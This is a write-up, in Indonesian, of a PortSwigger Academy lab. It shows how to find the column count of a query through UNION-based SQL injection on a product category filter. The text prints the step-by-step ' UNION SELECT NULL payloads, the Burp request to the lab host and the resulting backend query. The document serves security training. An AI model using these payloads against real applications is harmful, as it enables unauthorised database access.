# [PortSwigger Academy] SQL Injection - Lab #7

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection UNION attack, determining the number of columns returned by the query
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menentukan jumlah kolom yang dikembalikan oleh kueri asli aplikasi pada fitur filter kategori menggunakan teknik serangan UNION-Based SQLi.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi mengeksekusi kueri SQL secara dinamis untuk menyaring produk berdasarkan kategori. Untuk melakukan serangan `UNION`, penyerang harus memenuhi syarat mutlak: **Kueri tambahan (UNION) harus memiliki jumlah kolom yang sama persis dengan kueri asli backend.**

Ada dua metode utama untuk mendeteksi jumlah kolom:
1. **Metode `ORDER BY`:** Mengurutkan hasil berdasarkan nomor kolom tertentu sampai aplikasi menghasilkan error.
2. **Metode `UNION SELECT NULL`:** Menyisipkan nilai `NULL` secara bertahap sampai aplikasi merespons dengan normal (200 OK).

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

Pada pengujian ini, saya menggunakan teknik **`UNION SELECT NULL`** secara bertahap pada parameter kategori melalui Burp Repeater:

### Percobaan 1 Kolom
Suntikkan satu nilai `NULL` ke dalam parameter:
* **Payload:** `' UNION SELECT NULL--`
* **Respons:** *HTTP 500 Internal Server Error* (Jumlah kolom belum cocok).

### Percobaan 2 Kolom
Tambahkan nilai `NULL` kedua, dipisahkan dengan koma:
* **Payload:** `' UNION SELECT NULL, NULL--`
* **Respons:** *HTTP 500 Internal Server Error* (Jumlah kolom masih belum cocok).

### Percobaan 3 Kolom
Tambahkan nilai `NULL` ketiga:
* **Payload:** `' UNION SELECT NULL, NULL, NULL--`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2
Host: 0a9e000503dc83dc816661a800d6009a.web-security-academy.net
```
Respons: HTTP 200 OK (Aplikasi merespons dengan normal dan menampilkan halaman produk)

### Hasil Eksekusi Database
Di sisi database backend, kueri dimanipulasi menjadi:
```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL, NULL--' AND released = 1
```
Hasil Akhir: Karena kueri dengan 3 nilai NULL berhasil dieksekusi tanpa error (HTTP 200), ini membuktikan secara valid bahwa kueri asli backend mengembalikan 3 kolom. Lab berhasil diselesaikan (Solved).